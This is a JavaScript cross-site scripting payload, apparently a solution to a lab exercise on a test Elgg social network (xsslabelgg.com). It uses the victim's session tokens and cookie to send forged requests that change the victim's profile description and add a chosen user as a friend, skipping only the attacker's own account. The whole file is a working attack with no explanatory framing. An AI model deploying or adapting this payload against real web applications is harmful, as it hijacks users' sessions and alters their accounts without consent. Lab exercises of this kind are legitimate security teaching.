var user = elgg.session.user.username;
if(user!='samy'){
    var Ajax=null;
    // Construct the header information for the HTTP request
    Ajax=new XMLHttpRequest();
    if(Ajax==null)
        alert("Ajax is null");
    Ajax.open("POST","http://www.xsslabelgg.com/action/profile/edit",true);
    Ajax.setRequestHeader("Host","www.xsslabelgg.com");
    Ajax.setRequestHeader("User-Agent","AJAX 1.2");
    Ajax.setRequestHeader("Accept","text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
    Ajax.setRequestHeader("Accept-Language","en-US,en;q=0.5");
    Ajax.setRequestHeader("Accept-Encoding","gzip, deflate");
    
    Ajax.setRequestHeader("Referer","http://www.xsslabelgg.com/profile/"+user+"/edit");

    Ajax.setRequestHeader("Cookie",document.cookie);
    Ajax.setRequestHeader("Connection","keep-alive");
    Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
    // Construct the content. The format of the content can be learned
    // from LiveHTTPHeaders.
    var content="__elgg_token="+elgg.security.token.__elgg_token+"&__elgg_ts="+elgg.security.token.__elgg_ts+"&name="+user+"&description=I'm your father!&guid="+elgg.session.user.guid; // You need to fill in the details.
    // Send the HTTP POST request.
    Ajax.setRequestHeader("Content-Length",content.length);
    Ajax.send(content);

    var Ajax2=null;
    // Construct the header information for the HTTP request
    Ajax2=new XMLHttpRequest();
    if(Ajax2==null)
        alert("Ajax2 is null");
    Ajax2.open("GET","http://www.xsslabelgg.com/action/friends/add?friend="+"42"+"&__elgg_ts="+elgg.security.token.__elgg_ts+"&__elgg_token="+elgg.security.token.__elgg_token,true);
    Ajax2.setRequestHeader("Host","www.xsslabelgg.com");
    Ajax2.setRequestHeader("User-Agent","Ajax2 1.2");
    Ajax2.setRequestHeader("Accept","text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
    Ajax2.setRequestHeader("Accept-Language","en-US,en;q=0.5");
    Ajax2.setRequestHeader("Accept-Encoding","gzip, deflate");
    
    Ajax2.setRequestHeader("Referer","http://www.xsslabelgg.com/profile/samy");

    Ajax2.setRequestHeader("Cookie",document.cookie);
    Ajax2.setRequestHeader("Connection","keep-alive");
    // Send the HTTP POST request.
    Ajax2.send();
}


